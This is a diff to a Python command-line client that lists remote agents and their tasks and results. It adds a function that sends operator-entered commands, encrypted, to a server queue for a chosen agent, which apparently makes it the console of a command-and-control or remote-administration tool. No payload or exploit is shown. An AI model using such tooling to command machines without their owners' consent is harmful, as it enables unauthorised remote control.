@@ -39,16 +39,25 @@ def list_agents():
 
 def list_tasks(status):
     try:
-        response = requests.get(f"{SERVER_URL}/agents", timeout=10)
+        response = requests.get(f"{SERVER_URL}/tasks/{status}", timeout=10)
         response.raise_for_status()
         data = response.json()
-    except:
-        
 
+        print(RED + "Tasks Status " + status+ RESET)
+        if not data:
+            print("No tasks found.")
+            return
 
-
-
-    
+        for count, cmd in enumerate(data, start=1):
+            print(f"{YELLOW}{'-' * 100}{RESET}")
+            print(f"Command Id : {cmd['Command Id']}")
+            print(f"Agent Id   : {cmd['Agent Id']}")
+            print(f"Command    : {cmd['Command']}")
+            print(f"Status     : {cmd['Status']}")
+            print(f"Result     :\n{cmd['Result']}")
+    except Exception as e:
+        print(f"Error fetching tasks: {e}")
+  
 def show_agent_commands():
     try:
         agent_id = input("Enter the Agent ID: ")
@@ -57,7 +66,7 @@ def show_agent_commands():
         data = response.json()
         commands = data.get("Commands", [])
 
-        print(RED + "---- Agent Commands ----" + RESET)
+        print(RED + "Agent Commands" + RESET)
         print(f"Agent: {agent_id}")
 
         if not commands:
@@ -74,6 +83,27 @@ def show_agent_commands():
     except Exception as e:
         print(RED + f"Error fetching agent commands: {e}" + RESET)
 
+def send_command():
+    id = input("Enter Agent ID: ").strip()
+    command = input("Enter Command: ").strip()
+    try:
+        r = requests.post(
+            f"{SERVER_URL}/queue",
+            json={
+                "agent_id": id,
+                "command": encrypt(command)
+            },
+            timeout=10
+        )
+        r.raise_for_status() 
+
+        if r.status_code == 200:
+            print(f"[+] Command sent successfully to {id}")
+        else:
+            print(f"[!] Server returned status {r.status_code}")
+
+    except Exception as e:
+        print(f"[!] Failed to send command: {e}")
 
 def main():
     while True:
